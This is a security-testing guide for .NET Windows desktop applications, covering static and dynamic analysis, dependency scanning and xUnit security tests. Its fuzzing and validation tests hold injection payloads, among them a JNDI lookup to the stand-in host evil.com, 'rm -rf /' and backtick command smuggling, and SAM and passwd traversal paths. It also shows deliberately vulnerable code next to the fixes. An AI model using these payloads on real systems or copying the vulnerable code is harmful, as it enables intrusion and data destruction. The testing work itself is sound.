# Security Testing Guidelines

## Overview

This document provides comprehensive guidelines for security testing of Windows desktop applications, including Static Application Security Testing (SAST), Dynamic Application Security Testing (DAST), and penetration testing strategies.

## Table of Contents

1. [Security Testing Overview](#security-testing-overview)
2. [Static Application Security Testing (SAST)](#static-application-security-testing-sast)
3. [Dynamic Application Security Testing (DAST)](#dynamic-application-security-testing-dast)
4. [Dependency Scanning](#dependency-scanning)
5. [Penetration Testing](#penetration-testing)
6. [Security Unit Tests](#security-unit-tests)
7. [Code Review Checklist](#code-review-checklist)
8. [Continuous Security Integration](#continuous-security-integration)

---

## Security Testing Overview

### Testing Pyramid for Security

```
                    ▲
                   / \
                  /   \
                 /     \
                / Pen   \
               /  Test   \
              /___________\
             /             \
            /     DAST      \
           /_________________\
          /                   \
         /        SAST         \
        /_______________________\
       /                         \
      /    Security Unit Tests    \
     /___________________________  \
```

### Security Testing Phases

1. **Development:** Security unit tests, code review
2. **Build:** SAST, dependency scanning
3. **Pre-release:** DAST, penetration testing
4. **Production:** Monitoring, incident response

---

## Static Application Security Testing (SAST)

### Overview

SAST analyzes source code for security vulnerabilities without executing the application.

### Tools for .NET Applications

#### 1. Security Code Scan

**Installation:**
```bash
dotnet add package SecurityCodeScan.VS2019
```

**Configuration (.editorconfig):**
```ini
[*.cs]

# Enable Security Code Scan
dotnet_diagnostic.SCS0001.severity = warning
dotnet_diagnostic.SCS0002.severity = error  # SQL Injection
dotnet_diagnostic.SCS0003.severity = error  # XPath Injection
dotnet_diagnostic.SCS0004.severity = error  # Certificate Validation
dotnet_diagnostic.SCS0005.severity = warning # Weak Random
dotnet_diagnostic.SCS0006.severity = error  # Weak Hash
dotnet_diagnostic.SCS0007.severity = error  # XML External Entity
dotnet_diagnostic.SCS0008.severity = error  # Cookie Security
dotnet_diagnostic.SCS0009.severity = warning # CSRF
dotnet_diagnostic.SCS0010.severity = error  # Weak Cipher
```

#### 2. Roslyn Security Guard

**Installation:**
```bash
dotnet add package RoslynSecurityGuard
```

**Benefits:**
- Detects SQL injection vulnerabilities
- Identifies weak cryptography
- Finds path traversal issues
- Detects LDAP injection

#### 3. Microsoft Code Analysis

**Project Configuration:**
```xml
<Project Sdk="Microsoft.NET.Sdk">
  <PropertyGroup>
    <TargetFramework>net8.0-windows10.0.26100.0</TargetFramework>
    
    <!-- Enable all code analysis -->
    <EnableNETAnalyzers>true</EnableNETAnalyzers>
    <AnalysisLevel>latest</AnalysisLevel>
    <EnforceCodeStyleInBuild>true</EnforceCodeStyleInBuild>
    
    <!-- Treat security warnings as errors -->
    <TreatWarningsAsErrors>true</TreatWarningsAsErrors>
    
    <!-- Enable specific security analyzers -->
    <AnalysisMode>AllEnabledByDefault</AnalysisMode>
  </PropertyGroup>

  <ItemGroup>
    <PackageReference Include="Microsoft.CodeAnalysis.NetAnalyzers" Version="8.0.0">
      <PrivateAssets>all</PrivateAssets>
      <IncludeAssets>runtime; build; native; contentfiles; analyzers</IncludeAssets>
    </PackageReference>
  </ItemGroup>
</Project>
```

### Running SAST

**Command Line:**
```bash
# Build with full analysis
dotnet build /p:Configuration=Release /p:RunAnalyzersDuringBuild=true

# Run specific analyzers
dotnet build /p:EnableNETAnalyzers=true /p:AnalysisLevel=latest

# Generate SARIF output
dotnet build /p:GenerateDocumentationFile=true /p:ReportAnalyzer=true
```

**CI/CD Integration:**
```yaml
# GitHub Actions example
name: Security Scan

on: [push, pull_request]

jobs:
  sast:
    runs-on: windows-latest
    
    steps:
    - uses: actions/checkout@v3
    
    - name: Setup .NET
      uses: actions/setup-dotnet@v3
      with:
        dotnet-version: '8.0.x'
    
    - name: Restore dependencies
      run: dotnet restore
    
    - name: Build with analysis
      run: dotnet build --configuration Release /p:TreatWarningsAsErrors=true
    
    - name: Run Security Code Scan
      run: dotnet build /t:SecurityCodeScan
```

### Common SAST Findings and Fixes

#### 1. SQL Injection (SCS0002)

**Vulnerable Code:**
```csharp
public User GetUser(string username)
{
    var query = $"SELECT * FROM Users WHERE Username = '{username}'";
    return ExecuteQuery(query);
}
```

**Fixed Code:**
```csharp
public User GetUser(string username)
{
    var query = "SELECT * FROM Users WHERE Username = @Username";
    using var command = new SqlCommand(query, connection);
    command.Parameters.AddWithValue("@Username", username);
    return ExecuteQuery(command);
}
```

#### 2. Weak Random (SCS0005)

**Vulnerable Code:**
```csharp
public string GenerateToken()
{
    var random = new Random();
    return random.Next().ToString();
}
```

**Fixed Code:**
```csharp
public string GenerateToken()
{
    using var rng = RandomNumberGenerator.Create();
    var bytes = new byte[32];
    rng.GetBytes(bytes);
    return Convert.ToBase64String(bytes);
}
```

#### 3. Certificate Validation Disabled (SCS0004)

**Vulnerable Code:**
```csharp
var handler = new HttpClientHandler
{
    ServerCertificateCustomValidationCallback = (sender, cert, chain, errors) => true
};
```

**Fixed Code:**
```csharp
var handler = new HttpClientHandler
{
    ServerCertificateCustomValidationCallback = (sender, cert, chain, errors) =>
    {
        if (errors == SslPolicyErrors.None)
            return true;
        
        Logger.Error($"Certificate validation failed: {errors}");
        return false;
    }
};
```

---

## Dynamic Application Security Testing (DAST)

### Overview

DAST tests running applications for vulnerabilities by simulating attacks.

### Testing Local HTTP APIs

For applications like UniGetUI with local HTTP APIs:

```csharp
public class SecurityTestSuite
{
    private const string ApiBaseUrl = "http://localhost:7058";
    
    [Fact]
    public async Task API_ShouldRejectRequestsWithoutToken()
    {
        using var client = new HttpClient();
        
        // Try accessing protected endpoint without token
        var response = await client.GetAsync($"{ApiBaseUrl}/widgets/v1/get_updates");
        
        Assert.Equal(HttpStatusCode.Unauthorized, response.StatusCode);
    }
    
    [Fact]
    public async Task API_ShouldRejectInvalidTokens()
    {
        using var client = new HttpClient();
        
        var response = await client.GetAsync(
            $"{ApiBaseUrl}/widgets/v1/get_updates?token=invalid-token"
        );
        
        Assert.Equal(HttpStatusCode.Unauthorized, response.StatusCode);
    }
    
    [Fact]
    public async Task API_ShouldHandleInjectionAttempts()
    {
        using var client = new HttpClient();
        var validToken = GetValidTestToken();
        
        // SQL injection attempt
        var response = await client.GetAsync(
            $"{ApiBaseUrl}/widgets/v1/get_updates?token={validToken}&id=' OR '1'='1"
        );
        
        // Should not cause errors or expose data
        Assert.True(response.IsSuccessStatusCode || 
                   response.StatusCode == HttpStatusCode.BadRequest);
    }
    
    [Fact]
    public async Task API_ShouldRejectOversizedRequests()
    {
        using var client = new HttpClient();
        var validToken = GetValidTestToken();
        
        // Large payload attack
        var largePayload = new string('A', 10 * 1024 * 1024); // 10MB
        var content = new StringContent(largePayload);
        
        var response = await client.PostAsync(
            $"{ApiBaseUrl}/widgets/v1/update_package?token={validToken}",
            content
        );
        
        // Should reject or handle gracefully
        Assert.NotEqual(HttpStatusCode.InternalServerError, response.StatusCode);
    }
}
```

### Fuzzing Tests

```csharp
public class FuzzingTests
{
    private static readonly string[] InjectionPayloads = new[]
    {
        "' OR '1'='1",
        "<script>alert('XSS')</script>",
        "../../etc/passwd",
        "${jndi:ldap://evil.com/a}",
        "../../Windows/System32/config/SAM",
        "%00",
        "\0",
        "'; DROP TABLE Users--"
    };
    
    [Theory]
    [MemberData(nameof(GetInjectionPayloads))]
    public void PackageManager_ShouldHandleInjectionPayloads(string payload)
    {
        var executor = new SafeProcessExecutor();
        
        // Should throw validation exception or sanitize input
        Assert.ThrowsAny<Exception>(() => 
        {
            executor.ExecutePackageManager("winget", "install", payload);
        });
    }
    
    public static IEnumerable<object[]> GetInjectionPayloads()
    {
        return InjectionPayloads.Select(p => new object[] { p });
    }
    
    [Fact]
    public void FileHandler_ShouldRejectPathTraversal()
    {
        var handler = new SecurePathHandler(Path.GetTempPath());
        var traversalAttempts = new[]
        {
            "../../../Windows/System32/config/SAM",
            "..\\..\\..\\sensitive-file.txt",
            "/etc/passwd",
            "C:\\Windows\\System32\\config\\SAM"
        };
        
        foreach (var attempt in traversalAttempts)
        {
            Assert.Throws<UnauthorizedAccessException>(() => 
            {
                handler.GetSecurePath(attempt);
            });
        }
    }
}
```

---

## Dependency Scanning

### Overview

Dependency scanning identifies known vulnerabilities in third-party packages.

### Tools

#### 1. OWASP Dependency-Check

**Installation:**
```bash
dotnet tool install --global dependency-check
```

**Usage:**
```bash
dependency-check --project "MyApp" --scan "./src" --format HTML --format JSON
```

#### 2. Snyk

**Installation:**
```bash
npm install -g snyk
```

**Usage:**
```bash
snyk auth
snyk test --file=src/MyApp/MyApp.csproj
snyk monitor
```

#### 3. GitHub Dependabot

**Configuration (.github/dependabot.yml):**
```yaml
version: 2
updates:
  - package-ecosystem: "nuget"
    directory: "/"
    schedule:
      interval: "daily"
    open-pull-requests-limit: 10
    labels:
      - "dependencies"
      - "security"
    reviewers:
      - "security-team"
```

### Automated Vulnerability Checks

```csharp
public class DependencyScanner
{
    public async Task<List<Vulnerability>> ScanDependenciesAsync()
    {
        var vulnerabilities = new List<Vulnerability>();
        
        // Parse project file
        var projectFile = "MyApp.csproj";
        var doc = XDocument.Load(projectFile);
        
        var packages = doc.Descendants("PackageReference")
            .Select(p => new
            {
                Name = p.Attribute("Include")?.Value,
                Version = p.Attribute("Version")?.Value
            })
            .Where(p => p.Name != null && p.Version != null);
        
        // Check each package against vulnerability database
        foreach (var package in packages)
        {
            var vulns = await CheckVulnerabilityDatabaseAsync(
                package.Name!, 
                package.Version!
            );
            
            vulnerabilities.AddRange(vulns);
        }
        
        return vulnerabilities;
    }
    
    private async Task<List<Vulnerability>> CheckVulnerabilityDatabaseAsync(
        string packageName, 
        string version
    )
    {
        // Query NVD, GitHub Advisory, etc.
        // This is a simplified example
        var url = $"https://api.github.com/advisories?package={packageName}&version={version}";
        
        using var client = new HttpClient();
        client.DefaultRequestHeaders.Add("User-Agent", "SecurityScanner");
        
        var response = await client.GetAsync(url);
        if (!response.IsSuccessStatusCode)
            return new List<Vulnerability>();
        
        var json = await response.Content.ReadAsStringAsync();
        // Parse and return vulnerabilities
        
        return new List<Vulnerability>();
    }
}

public class Vulnerability
{
    public string PackageName { get; set; } = "";
    public string Version { get; set; } = "";
    public string CVE { get; set; } = "";
    public string Severity { get; set; } = "";
    public string Description { get; set; } = "";
    public string FixedVersion { get; set; } = "";
}
```

---

## Penetration Testing

### Overview

Penetration testing simulates real-world attacks to identify security weaknesses.

### Testing Checklist

#### Authentication Testing

- [ ] Test token generation strength
- [ ] Verify token expiration
- [ ] Test session management
- [ ] Attempt brute force attacks
- [ ] Test credential storage security

```csharp
[Fact]
public void TokenGeneration_ShouldBeUnpredictable()
{
    var tokens = new HashSet<string>();
    
    // Generate 1000 tokens
    for (int i = 0; i < 1000; i++)
    {
        var token = SecureTokenGenerator.GenerateToken();
        tokens.Add(token);
    }
    
    // All tokens should be unique
    Assert.Equal(1000, tokens.Count);
    
    // Tokens should be sufficiently long
    Assert.All(tokens, token => Assert.True(token.Length >= 32));
}

[Fact]
public async Task BruteForce_ShouldBeThrottled()
{
    var authService = new AuthenticationService();
    var failedAttempts = 0;
    
    // Attempt 100 logins in quick succession
    for (int i = 0; i < 100; i++)
    {
        var result = await authService.AuthenticateAsync("invalid-token");
        if (!result)
            failedAttempts++;
    }
    
    // Should implement rate limiting or account lockout
    Assert.Equal(100, failedAttempts);
    
    // Verify throttling is in place
    var throttleTime = await authService.GetThrottleDelayAsync();
    Assert.True(throttleTime > TimeSpan.Zero);
}
```

#### Input Validation Testing

```csharp
[Theory]
[InlineData("'; DROP TABLE Users--")]
[InlineData("<script>alert('XSS')</script>")]
[InlineData("../../etc/passwd")]
[InlineData("${jndi:ldap://evil.com/a}")]
[InlineData("%00")]
public void InputValidation_ShouldRejectMaliciousInput(string maliciousInput)
{
    var validator = new InputValidator();
    
    Assert.False(validator.IsValidPackageName(maliciousInput));
    Assert.Throws<ArgumentException>(() =>
    {
        validator.ValidateOrThrow(maliciousInput);
    });
}
```

#### Encryption Testing

```csharp
[Fact]
public void Encryption_ShouldUseStrongAlgorithm()
{
    var encrypted = DataProtection.ProtectString("sensitive data");
    
    // Encrypted data should be different from plaintext
    Assert.NotEqual("sensitive data", encrypted);
    
    // Encrypted data should be non-deterministic
    var encrypted2 = DataProtection.ProtectString("sensitive data");
    // Note: DPAPI may produce same output; use additional entropy if needed
}

[Fact]
public void Encryption_ShouldPreventTampering()
{
    var original = "sensitive data";
    var encrypted = DataProtection.ProtectString(original);
    
    // Tamper with encrypted data
    var tampered = encrypted.Substring(0, encrypted.Length - 5) + "XXXXX";
    
    // Decryption should fail
    Assert.Throws<CryptographicException>(() =>
    {
        DataProtection.UnprotectString(tampered);
    });
}
```

#### File Access Testing

```csharp
[Fact]
public void FileAccess_ShouldPreventDirectoryTraversal()
{
    var handler = new SecurePathHandler(Path.GetTempPath());
    
    var traversalAttempts = new[]
    {
        "../../../sensitive-file.txt",
        "..\\..\\..\\Windows\\System32\\config\\SAM",
        "/etc/passwd"
    };
    
    foreach (var attempt in traversalAttempts)
    {
        Assert.Throws<UnauthorizedAccessException>(() =>
        {
            handler.GetSecurePath(attempt);
        });
    }
}

[Fact]
public void FilePermissions_ShouldBeRestricted()
{
    var testFile = Path.Combine(Path.GetTempPath(), "test-secure.txt");
    File.WriteAllText(testFile, "sensitive data");
    
    SecureFilePermissions.SetUserOnlyPermissions(testFile);
    
    var fileInfo = new FileInfo(testFile);
    var security = fileInfo.GetAccessControl();
    var rules = security.GetAccessRules(true, true, typeof(NTAccount));
    
    // Should only have rules for current user
    var currentUser = WindowsIdentity.GetCurrent().Name;
    var userRules = rules.Cast<FileSystemAccessRule>()
        .Where(r => r.IdentityReference.Value.Equals(currentUser, StringComparison.OrdinalIgnoreCase))
        .ToList();
    
    Assert.NotEmpty(userRules);
    
    // Cleanup
    File.Delete(testFile);
}
```

---

## Security Unit Tests

### Test Organization

```
Tests/
├── Security/
│   ├── Authentication/
│   │   ├── TokenGenerationTests.cs
│   │   ├── TokenValidationTests.cs
│   │   └── OAuth2FlowTests.cs
│   ├── DataProtection/
│   │   ├── EncryptionTests.cs
│   │   ├── CredentialStorageTests.cs
│   │   └── SecureFileTests.cs
│   ├── InputValidation/
│   │   ├── PackageNameValidationTests.cs
│   │   ├── PathValidationTests.cs
│   │   └── UrlValidationTests.cs
│   └── VulnerabilityPrevention/
│       ├── InjectionPreventionTests.cs
│       ├── XSSPreventionTests.cs
│       └── PathTraversalTests.cs
```

### Example Test Suite

```csharp
using Xunit;

public class AuthenticationSecurityTests
{
    [Fact]
    public void TokenGeneration_ShouldUseCryptographicRandom()
    {
        var token = SecureTokenGenerator.GenerateToken();
        
        Assert.NotNull(token);
        Assert.True(token.Length >= 32);
        Assert.Matches(@"^[A-Za-z0-9+/=]+$", token);
    }
    
    [Fact]
    public void TokenValidation_ShouldUseConstantTimeComparison()
    {
        var validator = new TokenValidator("valid-token", TimeSpan.FromMinutes(5));
        
        var startValid = DateTime.UtcNow;
        var resultValid = validator.ValidateToken("valid-token");
        var timeValid = DateTime.UtcNow - startValid;
        
        var startInvalid = DateTime.UtcNow;
        var resultInvalid = validator.ValidateToken("invalid-token");
        var timeInvalid = DateTime.UtcNow - startInvalid;
        
        // Timing should be similar (constant-time comparison)
        var timeDiff = Math.Abs(timeValid.TotalMilliseconds - timeInvalid.TotalMilliseconds);
        Assert.True(timeDiff < 10); // Within 10ms
    }
    
    [Fact]
    public void PasswordStorage_ShouldUseWindowsCredentialManager()
    {
        var testPassword = "test-password-123";
        SecureTokenStorage.StoreToken(testPassword);
        
        var retrieved = SecureTokenStorage.RetrieveToken();
        Assert.Equal(testPassword, retrieved);
        
        // Cleanup
        SecureTokenStorage.DeleteToken();
        Assert.Null(SecureTokenStorage.RetrieveToken());
    }
}

public class DataProtectionSecurityTests
{
    [Fact]
    public void Encryption_ShouldPreventPlaintextStorage()
    {
        var plaintext = "sensitive-data";
        var encrypted = DataProtection.ProtectString(plaintext);
        
        Assert.NotEqual(plaintext, encrypted);
        Assert.DoesNotContain(plaintext, encrypted);
    }
    
    [Fact]
    public void Encryption_ShouldBeReversible()
    {
        var original = "test-data-12345";
        var encrypted = DataProtection.ProtectString(original);
        var decrypted = DataProtection.UnprotectString(encrypted);
        
        Assert.Equal(original, decrypted);
    }
    
    [Fact]
    public void SecureFile_ShouldOverwriteOnDelete()
    {
        using var tempFile = new SecureTempFile();
        var testData = "sensitive-information";
        
        tempFile.WriteContent(Encoding.UTF8.GetBytes(testData));
        var path = tempFile.FilePath;
        
        // File should exist
        Assert.True(File.Exists(path));
        
        // Dispose (triggers secure delete)
        tempFile.Dispose();
        
        // File should be deleted
        Assert.False(File.Exists(path));
    }
}

public class InputValidationSecurityTests
{
    [Theory]
    [InlineData("valid-package")]
    [InlineData("my.package.name")]
    [InlineData("package_123")]
    public void PackageNameValidation_ShouldAcceptValidNames(string packageName)
    {
        Assert.True(InputValidator.IsValidPackageName(packageName));
    }
    
    [Theory]
    [InlineData("../../../etc/passwd")]
    [InlineData("package; rm -rf /")]
    [InlineData("package`whoami`")]
    [InlineData("")]
    [InlineData(null)]
    public void PackageNameValidation_ShouldRejectInvalidNames(string packageName)
    {
        Assert.False(InputValidator.IsValidPackageName(packageName));
    }
}
```

---

## Code Review Checklist

### Security-Focused Code Review

#### Authentication & Authorization
- [ ] Tokens generated using cryptographically secure random
- [ ] Token validation uses constant-time comparison
- [ ] Credentials stored in Windows Credential Manager or encrypted
- [ ] No hard-coded credentials in source code
- [ ] OAuth implementation follows RFC 8252 (native apps)

#### Data Protection
- [ ] Sensitive data encrypted at rest using DPAPI
- [ ] Encryption keys not hard-coded
- [ ] Secure deletion implemented for sensitive files
- [ ] Memory cleared after handling sensitive data
- [ ] TLS/HTTPS used for all network communication

#### Input Validation
- [ ] All user inputs validated before use
- [ ] Validation uses allow-list approach
- [ ] Regular expressions anchored (^ and $)
- [ ] Path traversal prevention implemented
- [ ] File names sanitized before use

#### Process Execution
- [ ] UseShellExecute = false for all process execution
- [ ] ArgumentList used instead of Arguments string
- [ ] Process paths validated before execution
- [ ] No user input directly in command strings
- [ ] Output properly sanitized before display

#### Error Handling
- [ ] Sensitive information not exposed in error messages
- [ ] Exceptions logged with sufficient detail
- [ ] No stack traces exposed to users
- [ ] Fail securely on errors

#### Logging
- [ ] Sensitive data redacted from logs
- [ ] Security events properly logged
- [ ] Log injection prevented
- [ ] Logs protected from tampering

---

## Continuous Security Integration

### GitHub Actions Security Workflow

```yaml
name: Security Checks

on:
  push:
    branches: [ main, develop ]
  pull_request:
    branches: [ main, develop ]
  schedule:
    - cron: '0 0 * * 0'  # Weekly scan

jobs:
  security-scan:
    runs-on: windows-latest
    
    steps:
    - uses: actions/checkout@v3
    
    - name: Setup .NET
      uses: actions/setup-dotnet@v3
      with:
        dotnet-version: '8.0.x'
    
    - name: Restore dependencies
      run: dotnet restore
    
    - name: Build with security analysis
      run: dotnet build --configuration Release /p:TreatWarningsAsErrors=true
    
    - name: Run security tests
      run: dotnet test --filter Category=Security
    
    - name: Run SAST
      run: dotnet build /t:SecurityCodeScan
    
    - name: Dependency scan
      uses: snyk/actions/dotnet@master
      env:
        SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}
      with:
        command: test
        args: --severity-threshold=high
    
    - name: Upload security reports
      uses: actions/upload-artifact@v3
      if: always()
      with:
        name: security-reports
        path: |
          **/SecurityCodeScan.*.json
          **/dependency-check-report.html
```

### Pre-commit Security Checks

```bash
#!/bin/bash
# .git/hooks/pre-commit

echo "Running security checks..."

# Check for sensitive data
if git diff --cached | grep -iE "(password|api[_-]?key|secret|token|private[_-]?key)" > /dev/null; then
    echo "⚠️  Warning: Potential sensitive data detected in commit"
    echo "Please review and remove any secrets before committing"
    exit 1
fi

# Run quick security scan
dotnet build /p:RunAnalyzersDuringBuild=true
if [ $? -ne 0 ]; then
    echo "❌ Build failed with security warnings"
    exit 1
fi

echo "✅ Security checks passed"
exit 0
```

---

## Related Documentation

- [Authentication Patterns](./authentication-patterns.md) - Authentication implementation
- [Data Protection](./data-protection.md) - Encryption and secure storage
- [Vulnerability Prevention](./vulnerability-prevention.md) - Security best practices

---

## References

- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [NIST Software Verification Standard](https://csrc.nist.gov/publications/detail/sp/800-218/final)
- [Microsoft Security Development Lifecycle](https://www.microsoft.com/en-us/securityengineering/sdl)
- [CWE Software Weaknesses](https://cwe.mitre.org/)
- [SANS Testing Guidelines](https://www.sans.org/security-resources/)
